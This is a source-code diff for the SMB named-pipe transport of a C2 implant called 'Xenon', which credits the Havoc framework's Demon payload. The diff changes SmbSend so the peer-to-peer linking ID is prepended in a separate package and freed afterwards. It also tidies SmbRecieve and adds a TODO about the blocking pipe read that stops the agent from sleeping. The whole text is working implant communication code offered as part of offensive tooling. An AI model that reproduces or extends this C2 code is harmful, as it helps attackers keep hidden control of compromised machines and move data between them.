@@ -14,15 +14,18 @@
 /**
  * @brief Send data to SMB C2 Channel
  * 
- * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c
+ * @ref https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c
  * @return BOOL  
  */
 BOOL SmbSend(PPackage package)
 {
-	BOOL Success = FALSE;
+	BOOL   Success = FALSE;
 
-    /* Add Xenon Linking ID */
-    PackageAddInt32(package, xenonConfig->SmbId);
+    /* Prepend P2P Linking ID to Package */
+    PPackage Send = PackageInit(NULL, FALSE);
+    PackageAddInt32(Send, xenonConfig->SmbId);
+    PackageAddBytes(Send, package->buffer, package->length, FALSE);
+
 
 	/* Not initialized Yet */
 	if ( !xenonConfig->SmbPipe )
@@ -50,6 +53,7 @@ BOOL SmbSend(PPackage package)
 		if ( !xenonConfig->SmbPipe )
 			goto END;
 
+
 		if ( !ConnectNamedPipe(xenonConfig->SmbPipe, NULL) )
 		{
 			CloseHandle(xenonConfig->SmbPipe);
@@ -57,12 +61,12 @@ BOOL SmbSend(PPackage package)
 		}
 
 		/* Send the message to the named pipe */
-		if ( !PackageSendPipe(xenonConfig->SmbPipe, package->buffer, package->length) )
+		if ( !PackageSendPipe(xenonConfig->SmbPipe, Send->buffer, Send->length) )
 			goto END;
 	}
 
 	/* Send if pipe is already initialized */
-	if ( !PackageSendPipe(xenonConfig->SmbPipe, package->buffer, package->length) )
+	if ( !PackageSendPipe(xenonConfig->SmbPipe, Send->buffer, Send->length) )
 	{
 		DWORD error = GetLastError();
 		_err("Failed to write data to pipe. ERROR : %d", error);
@@ -78,20 +82,22 @@ BOOL SmbSend(PPackage package)
 	Success = TRUE;
 
 END:
-
+    PackageDestroy(Send);
 	return Success;
 }
+
+
 
 
 /**
  * @brief Read data from SMB C2 Channel
  * 
- * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c
+ * @ref https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c#L65
  * @return BOOL  
  */
 BOOL SmbRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
 {
-    BOOL success = FALSE;
+    BOOL  Success   = FALSE;
     DWORD bytesRead = 0;
     DWORD totalRead = 0;
     DWORD chunkSize = 4096;
@@ -101,7 +107,8 @@ BOOL SmbRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
     *pOutLen   = 0;
 
     // This call will block until data is available (PIPE_WAIT)
-    while (TRUE)
+    while (TRUE)                                                                // TODO - Change this to not BLOCK. Cause we want the agent to sleep ...
+                                                                                // https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c#L65
     {
         BOOL result = ReadFile(xenonConfig->SmbPipe, buffer, chunkSize, &bytesRead, NULL);
         if (!result)
@@ -151,17 +158,17 @@ BOOL SmbRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
     }
 
     *pOutLen = totalRead;
-    success = TRUE;
+    Success = TRUE;
 
 END:
-    if (!success && *ppOutData)
+    if (!Success && *ppOutData)
     {
         LocalFree(*ppOutData);
         *ppOutData = NULL;
         *pOutLen   = 0;
     }
 
-    return success;
+    return Success;
 }
 
 
